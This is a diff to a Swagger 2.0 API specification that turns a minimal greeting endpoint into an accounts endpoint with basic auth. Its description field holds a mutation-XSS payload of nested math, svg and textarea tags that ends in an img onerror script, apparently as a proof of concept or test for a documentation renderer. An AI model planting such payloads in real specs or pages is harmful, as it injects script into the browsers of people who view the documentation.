@@ -1,11 +1,24 @@
-swagger: "2.0"
+swagger: '2.0'
 info:
-  description: "<math><mtext><h1><a><h6></a></h6><mglyph><svg><mtext><textarea><a title='</textarea><img src onerror=alert(document.domain)>"
-  version: "1.0.0"
-  title: "Minimal API"
+  title: Classic API Resource Documentation
+  description: <math><mtext><h1><a><h6></a></h6><mglyph><svg><mtext><textarea><a title='</textarea><img src onerror=alert(document.domain)>'></textarea></h1>">"</textarea></desc></textarea></mtext></mtext></svg></mglyph></option></mtext></math>
+  version: production
+basePath: /JSSResource/
+produces:
+  - application/xml
+  - application/json
+consumes:
+  - application/xml
+  - application/json
+security:
+  - basicAuth: []
 paths:
-  /greet:
+  /accounts:
     get:
       responses:
         '200':
           description: No response was specified
+      tags:
+        - accounts
+      operationId: findAccounts
+      summary: Finds all accounts
